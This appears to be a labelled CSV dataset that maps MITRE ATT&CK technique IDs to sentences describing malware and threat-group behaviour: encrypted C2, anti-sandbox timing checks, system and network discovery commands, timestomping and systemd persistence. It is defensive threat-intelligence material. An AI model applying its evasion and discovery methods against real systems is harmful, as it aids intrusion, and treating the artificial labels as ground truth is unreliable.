label_tec,sentence
T1573,FatDuke can AES encrypt C2 communications.
T1573,WellMess can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.
T1573,BLINDINGCAN has encrypted its C2 traffic with RC4.
T1573,Lucifer can perform a decremental-xor encryption on the initial C2 request before sending it over the wire.
T1573,SUNBURST encrypted C2 traffic using a single-byte-XOR cipher.
T1573,BendyBear communicates to a C2 server over port 443 using modified RC4 and XOR-encrypted chunks.
T1573,Stuxnet also uses a 31-byte long static byte string to XOR data sent to command and control servers.
T1573,SodaMaster can use RC4 to encrypt C2 communications.
T1573,RainyDay can use RC4 to encrypt C2 communications.
T1573,Nebulae can use RC4 and XOR to encrypt C2 communications.
T1573,Metamorfo has encrypted C2 commands with AES-256.
T1573,BRONZE BUTLER has also used a tool called RarStar that encodes data with a custom XOR algorithm when posting it to a C2 server.
T1573,Another Lazarus Group malware sample XORs C2 traffic.
T1573,Inception has encrypted network communications with AES.
T1497,"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size."
T1497,"RogueRobin uses WMI to check BIOS version for VBOX, bochs, qemu, virtualbox, and vm to check for evidence that the script might be executing within an analysis environment."
T1497,OopsIE performs several anti-VM and sandbox checks on the victim's machine.
T1497,"GravityRAT uses WMI to check the BIOS and manufacturer information for strings like ""VMWare"", ""Virtual"", and ""XEN"" and another WMI request to get the current temperature of the hardware to determine if it's a virtual machine environment."
T1497,"UBoatRAT checks for virtualization software such as VMWare, VirtualBox, or QEmu on the compromised machine."
T1497,"Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis."
T1497,Trojan.Karagany can detect commonly used and generic virtualization platforms based primarily on drivers and file paths.
T1497,"Lucifer can check for specific usernames, computer names, device drivers, DLL's, and virtual devices associated with sandboxed environments and can enter an infinite loop and stop itself if any are detected."
T1497,SodaMaster can check for the presence of the Registry key HKEY_CLASSES_ROOT\\Applications\\VMwareHostOpen.exe before proceeding to its main functionality.
T1497,QakBot can check the compromised host for the presence of multiple executables associated with analysis tools and halt execution if any are found.
T1497,NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.
T1497,OilRig has used macros to verify if a mouse is connected to a compromised machine.
T1542,System firmware like BIOS and EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity.
T1082,Tools such as Systeminfo can be used to gather detailed system information.
T1082,JPIN can obtain system information such as OS version and disk space.
T1082,"OopsIE checks for information on the CPU fan, temperature, mouse, hard disk, and motherboard as part of its anti-VM checks."
T1082,Shamoon obtains the victim's operating system version and keyboard layout and sends the information to the C2 server.
T1082,"Zeus Panda collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system."
T1082,"DarkComet can collect the computer name, RAM used, and operating system version from the victim’s machine."
T1082,"FALLCHILL can collect operating system  version information, processor information, system name, and information about installed disks from the victim."
T1082,Zebrocy also runs the systeminfo command to gather system information.
T1082,"ChChes collects the victim hostname, window resolution, and Microsoft Windows version."
T1082,"RedLeaves can gather extended system information including the hostname, OS version number, platform, memory information, time elapsed since system startup, and CPU information."
T1082,SLOWDRIFT collects and sends system information to its C2.
T1082,POWERSTATS can retrieve OS name/architecture and computer/domain name information from compromised hosts.
T1082,SOUNDBITE is capable of gathering system information.
T1082,UPPERCUT has the capability to gather the system’s hostname and OS version.
T1082,More_eggs has the capability to gather the OS version and computer name.
T1082,"BUBBLEWRAP collects system information, including the operating system version and hostname."
T1082,Orz can gather the victim OS version and whether it is 64 or 32 bit.
T1082,PLAINTEE collects general system enumeration data about the infected machine and checks the OS version.
T1082,"MoonWind can obtain the victim hostname, Windows version, RAM amount, number of drives, and screen resolution."
T1082,"Reaver collects system information from the victim, including CPU speed, computer name, volume serial number, ANSI code page, OEM code page identifier for the OS, Microsoft Windows version, and memory information."
T1082,NavRAT uses systeminfo on a victim’s machine.
T1082,TURNEDUP is capable of gathering system information.
T1082,"HOPLIGHT has been observed collecting victim machine information like OS version, drivers, volume information and more."
T1082,"StoneDrill has the capability to discover the system OS, Windows version, architecture and environment."
T1082,njRAT enumerates the victim operating system and computer name during the initial infection.
T1082,Ixeshe collects the computer name of the victim's system during the initial infection.
T1082,LightNeuron gathers the victim computer name using the Win32 API call GetComputerName.
T1082,"OSX/Shlayer collects the IOPlatformUUID, session UID, and the OS version using the command sw_vers -productVersion."
T1082,PoetRAT has the ability to gather information about the compromised host.
T1082,Rifdoor has the ability to identify the Windows version on the compromised host.
T1082,Attor monitors the free disk space on the system.
T1082,"Ramsay can detect system information--including disk names, total space, and remaining space--to create a hardware profile GUID which acts as a system identifier for operators."
T1082,BackConfig has the ability to gather the victim's computer name.
T1082,"Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on."
T1082,"FatDuke can collect the user name, Windows version, computer name, and available space on discs from a compromised host."
T1082,"BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available."
T1082,SharpStage has checked the system settings to see if Arabic is the configured language.
T1082,MoleNet can collect information about the about the system.
T1082,BlackMould can enumerate local drives on a compromised host.
T1082,KillDisk retrieves the hard disk name by calling the CreateFileA to \\.\PHYSICALDRIVE0 API.
T1082,"Cuba can enumerate local drives, disk type, and disk free space."
T1082,QakBot can collect system information including the OS version and domain on a compromised host.
T1082,"APT37 collects the computer name, the BIOS model, and execution path."
T1082,"Stealth Falcon malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory."
T1082,APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim’s machine.
T1082,Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine.
T1082,"Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server."
T1082,"Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim’s machine."
T1082,"Several Lazarus Group malware families collect information on the type and version of the victim OS, as well as the victim computer name and CPU information."
T1082,A Destover-like variant used by Lazarus Group also collects disk space information and sends it to its C2 server.. APT18 can collect system information from the victim’s machine.
T1082,Inception has used a reconnaissance module to gather information about the operating system and hardware on the infected host.
T1082,"Frankenstein has enumerated hosts, looking for the system's machine name."
T1082,Rocke has used uname -m to collect the name and information about the infected system's kernel.
T1082,Wizard Spider has used “systeminfo” and similar commands to acquire detailed configuration information of a victim machine.
T1082,UNC2452 used fsutil to check available free space before executing actions that might create large files on disk.
T1082,"Sidewinder has used tools to collect the computer name, OS version, installed hotfixes, as well as information regarding the memory and processor on a compromised host."
T1082,Windigo has used a script to detect which Linux distribution and version is currently installed on the system.
T1082,APT29 used fsutil to check available free space before executing actions that might create large files on disk.
T1614,"Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions."
T1614,SynAck lists all the keyboard layouts installed on the victim’s system using GetKeyboardLayoutList API and checks against a hardcoded language code list.
T1614,"If a match if found, SynAck sleeps for 300 seconds and then exits without encrypting files."
T1614,"It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN."
T1614,Spark has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word “Arabic” before executing.
T1614,"Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
T1614,"Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services."
T1016,Several operating system administration utilities exist that can be used to gather this information.
T1016,Comnie uses ipconfig /all and route PRINT to identify network adapter and interface information.
T1016,POWRUNER may collect network configuration data by running ipconfig /all on a victim.
T1016,Orz can gather victim proxy information.
T1016,"Kwampirs collects network adapter and interface information by using the commands ipconfig /all, arp -a and route print."
T1016,Brave Prince gathers network configuration information as well as the ARP cache.
T1016,Felismus collects the victim LAN IP address and sends it to the C2 server.
T1016,Kazuar gathers information about network adapters.
T1016,Unknown Logger can obtain information about the victim's IP address.
T1016,Denis uses ipconfig to gather the IP address from the system.
T1016,KEYMARBLE gathers the MAC address of the victim’s machine.
T1016,More_eggs has the capability to gather the IP address from the victim's machine.
T1016,Agent Tesla can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.
T1016,Octopus can collect the host IP address from the victim’s machine.
T1016,Naid collects the domain name from a compromised host.
T1016,Epic uses the nbtstat -n and nbtstat -s commands on the victim’s machine.
T1016,Ryuk has called GetIpNetTable in attempt to identify all mounted drives and hosts that have Address Resolution Protocol  entries.
T1016,SDBbot has the ability to determine the domain name and whether a proxy is configured on a compromised host.
T1016,down_new has the ability to identify the MAC address of a compromised host.
T1016,OSX_OCEANLOTUS.D can collect the network interface MAC address on the infected host.
T1016,Stuxnet collects the IP address of a compromised system.
T1016,Dtrack can collect the host's IP addresses using the ipconfig command.
T1016,ShadowPad has collected the domain name of the victim system.
T1016,Explosive has collected the MAC address from the victim's machine.
T1016,EKANS can determine the domain of a compromised host.
T1016,"QakBot can use net config workstation, arp -a, and ipconfig /all to gather network configuration information."
T1016,xCaon has used the GetAdaptersInfo API call to get the victim's MAC address.
T1016,BLUELIGHT can collect IP information from the victim’s machine.
T1016,Kobalos can record the IP address of the target machine.
T1016,APT19 used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim’s machine.
T1016,Darkhotel has collected the IP address and network adapter information from the victim’s machine.
T1016,OilRig has run ipconfig /all on a victim.
T1016,"Dragonfly 2.0 used batch scripts to enumerate network information, including information about trusts, zones, and the domain."
T1016,MuddyWater has used malware to collect the victim’s IP address and domain name.
T1016,GALLIUM used ipconfig /all to obtain information about the victim network configuration.
T1016,"Wizard Spider has used ""ipconfig"" to identify the network configuration of a victim machine."
T1016,Higaisa used ipconfig to gather network configuration information.
T1016,Mustang Panda has used ipconfig and arp to determine network configuration information.
T1049,Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.
T1049,RATANKBA uses netstat -ano to search for specific IP address ranges.
T1049,Sykipot may use netstat -ano to display active network connections.
T1049,Comnie executes the netstat -ano command.
T1049,BlackEnergy has gathered information about local network connections using netstat.
T1049,GravityRAT uses the netstat command to find open ports on the victim’s machine.
T1049,Trojan.Karagany can use netstat to collect a list of network connections.
T1049,NETWIRE can capture session logon details from a compromised host.
T1049,Conti can enumerate routine network connections from a compromised host.
T1049,Poseidon Group obtains and saves information about victim network interfaces and addresses.
T1049,It has also accessed network diagram files useful for understanding how a host's network was configured.
T1049,Chimera has used netstat -ano | findstr EST to discover network connections.
T1049,TeamTNT runs netstat -anp to search for rival malware connections.
T1049,TeamTNT has also used libprocesshider to modify /etc/ld.so.preload.
T1033,"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system."
T1033,"They may do this, for example, by retrieving account usernames or by using OS Credential Dumping."
T1033,Reaver collects the victim's username.
T1033,Backdoor.Oldrea collects the current username from the victim.
T1033,WINERACK can gather information on the victim username.
T1033,Agent Tesla can collect the username from the victim’s machine.
T1033,Azorult can collect the username from the victim’s machine.
T1033,PowerDuke has commands to get the current user's name and SID.
T1033,Cardinal RAT can collect the username from a victim machine.
T1033,InvisiMole lists local users and session information.
T1033,A module in Prikormka collects information from the victim about the current user name.
T1033,SynAck gathers user names from infected hosts.
T1033,Zebrocy gets the username from the system.
T1033,Linux Rabbit opens a socket on port 22 and if it receives a response it attempts to obtain the machine's hostname and Top-Level Domain.
T1033,FlawedAmmyy enumerates the current user during the initial infection.
T1033,ServHelper will attempt to enumerate the username of the victim.
T1033,Ixeshe collects the username from the victim’s machine.
T1033,"PoetRAT sent username, computer name, and the previously generated UUID in reply to a ""who"" command from C2."
T1033,SDBbot has the ability to identify the user on a compromised host.
T1033,Valak can gather information regarding the user.
T1033,Goopy has the ability to enumerate the infected system's user name.
T1033,SLOTHFULMEDIA has collected the username from a victim machine.
T1033,Egregor has used tools to gather information about users.
T1033,SideTwist can collect the username on a targeted system.
T1033,Metamorfo has collected the username from the victim's machine.
T1033,"An APT3 downloader uses the Windows command ""cmd.exe"" /C whoami to verify that it is running with the elevated privileges of “System.” A Gamaredon Group file stealer can gather the victim's username to send to a C2 server."
T1033,Dragonfly 2.0 used the command query user on victim hosts.
T1033,APT39 used Remexi to collect usernames from the system.
T1033,"Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system."
T1033,ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.
T1033,"APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users."
T1007,Epic uses the tasklist /svc command to list the services on the system.
T1007,BBSRAT can query service configuration information.
T1007,Sykipot may use net start to display running services.
T1007,ZLib has the ability to discover and manipulate Windows services.
T1007,InvisiMole can obtain running services on the victim.
T1007,Ursnif has gathered information about running services.
T1007,HotCroissant has the ability to retrieve a list of services on the infected host.
T1007,Caterpillar WebShell can obtain a list of the services from a system.
T1007,Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.
T1007,Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.
T1569,Adversaries may abuse system services or daemons to execute commands or programs.
T1569,Adversaries can execute malicious content by interacting with or creating services either locally or remotely.
T1569,"Many services are set to run at boot, which can aid in achieving persistence , but adversaries can also abuse services for one-time or temporary execution."
T1529,Operating systems may contain commands to initiate a shutdown/reboot of a machine.
T1529,LockerGoga has been observed shutting down infected systems.
T1529,KillDisk attempts to reboot the machine by terminating specific processes.
T1124,"As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server."
T1124,Agent Tesla can collect the timestamp from the victim’s machine.
T1124,"PowerDuke has commands to get the time the machine was built, the time, and the time zone."
T1124,HOPLIGHT has been observed collecting system time from victim machines.
T1124,StoneDrill can obtain the current date and time of the victim machine.
T1124,"EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox."
T1124,GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.
T1124,build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.
T1124,Stuxnet collects the time and date of a system when it is infected.
T1124,Operation Wocao has used the time command to retrieve the current time of a compromised system.
T1124,Chimera has used time /t and net time \\ip/hostname for system time discovery.
T1124,Sidewinder has used tools to obtain the current system time.
T1124,ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.
T1543,Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence.
T1543,The systemd service manager is commonly used for managing background daemon processes  and other system resources.
T1543,"While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence."
T1543,Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
T1543,TeamTNT has established persistence through the creation of a cryptocurrency mining system service.
T1053,Timers can be set to run on a calendar event or after a time span relative to a starting point.
T1053,"Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH."
T1053,"Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service."
T1080,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories."
T1080,"Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system."
T1080,Adversaries may use tainted shared content to move laterally.
T1080,Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.
T1221,Microsoft’s Office Open XML  specification defines an XML-based format for Office documents  to replace older binary formats .
T1221,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.
T1221,Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
T1221,Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
T1055,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
T1597,Adversaries may search private data from threat intelligence vendors for information that can be used during targeting.
T1597,Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported.
T1497,Delays may also be based on waiting for specific victim conditions to be met  or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.
T1497,"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function."
T1497,Bazar can use a timer to delay execution of core functionality.
T1497,BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.
T1497,"ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox."
T1497,EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.
T1497,"SodaMaster has the ability to put itself to ""sleep"" for a specified time."
T1497,Clop has used the sleep command to avoid sandbox detection.
T1497,Lokibot has performed a time-based anti-debug check before downloading its third stage.
T1497,"Using the machine's local time, XCSSET waits 43200 seconds  from the initial creation timestamp of a specific file, .report."
T1497,"After the elapsed time, XCSSET executes additional modules."
T1547,Time providers are implemented as dynamic-link libraries  that are registered in the subkeys of  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.
T1547,"Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account."
T1070,"Timestomping is a technique that modifies the timestamps of a file , often to mimic files that are in the same folder."
T1070,InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values.
T1070,BLINDINGCAN has modified file and directory timestamps.
T1070,OSX_OCEANLOTUS.D can use the touch -t command to change timestamps.
T1070,EVILNUM has changed the creation date of files.
T1070,BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.
T1070,Cobalt Strike will timestomp any files or payloads placed on a target machine to help them blend in.
T1070,APT29 modified timestamps of backdoors to match legitimate Windows files.
T1134,"For example, this may be useful for when the target user has a non-network logon session on the system."
T1134,"Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient."
T1588,"Commercial software may be obtained through purchase, stealing licenses , or cracking trial versions."
T1588,"In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities ."
T1588,Sandworm Team has acquired open-source tools for some of it's operations; for example it acquired Invoke-PSImage to establish an encrypted channel from a compromised host to Sandworm Team's C2 server as part of its preparation for the 2018 Winter Olympics attack.
T1588,APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.
T1588,"APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder."
T1588,IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations.
